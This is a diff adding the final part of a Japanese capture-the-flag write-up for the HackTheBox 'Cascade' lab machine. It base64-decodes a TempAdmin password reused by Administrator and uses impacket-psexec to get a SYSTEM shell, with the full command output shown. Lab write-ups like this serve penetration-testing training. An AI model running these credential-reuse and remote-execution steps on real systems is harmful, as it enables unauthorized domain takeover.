@@ -340,3 +340,44 @@ dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
 givenName                       : TempAdmin
 ...
 ```
+
+先にSMBシェアのDataフォルダにあった”Meeting_Notes_June_2018.html”に次のように書いてある：
+
+![htmlfile](https://user-images.githubusercontent.com/85237728/197943493-1f79dbcc-a0df-41c9-ab1d-04dbf52c0da1.png)
+
+AdministratorのパスワードがTempAdminのパスワードが同じ。
+
+TempAdminのパスワードをデコードする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d              
+baCT3r1aN00dles
+```
+このパスワードを使ってAdminのシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ impacket-psexec -dc-ip 10.10.10.182 'cascade.local/Administrator:baCT3r1aN00dles@10.10.10.182'
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.182.....
+[*] Found writable share ADMIN$
+[*] Uploading file SxxbiGOE.exe
+[*] Opening SVCManager on 10.10.10.182.....
+[*] Creating service TyLD on 10.10.10.182.....
+[*] Starting service TyLD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+# 感想
+
+複数のツールを使ってしらべることの大切さを実感した。ldapsearchで細かく調べたり。
+
+またリバースエンジニアリングの練習も少しできたのでよかった（WindowsのBoxではこのような、exeファイルをRevしてパスワードやキーを得るという機会がけっこうある）。
+
